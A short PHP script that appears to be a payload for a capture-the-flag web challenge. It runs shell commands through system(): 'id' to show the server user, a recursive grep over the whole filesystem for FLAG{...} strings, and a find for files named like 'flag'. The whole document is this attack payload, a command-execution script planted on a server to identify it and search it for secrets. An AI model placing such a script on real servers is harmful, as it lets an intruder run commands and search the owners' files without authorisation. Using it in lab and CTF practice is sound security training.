<?php
echo "=== id ===\n"; system('id');
echo "=== grep FLAG ===\n";
system("grep -rEao 'FLAG\{[0-9a-f]{64}\}' / 2>/dev/null | head -20");
echo "=== find flag files ===\n";
system("find / -iname '*flag*' 2>/dev/null | head -40");
